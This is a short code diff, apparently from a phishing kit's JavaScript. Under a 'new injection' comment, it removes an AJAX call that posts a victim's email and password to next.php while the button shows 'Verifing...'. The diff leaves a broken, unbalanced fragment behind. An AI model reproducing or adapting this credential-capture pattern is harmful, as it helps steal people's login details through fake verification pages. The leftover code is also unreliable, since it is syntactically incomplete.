@@ -384,14 +384,7 @@
       ///////////new injection////////////////
       count=count+1;
       
-      $.ajax({
-        dataType: 'JSON',
-        url: 'next.php',
-        type: 'POST',
-        data:{
-          email:email,
-          password:password,
-        },
+   
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
               $('#submit-btn').html('Verifing...');
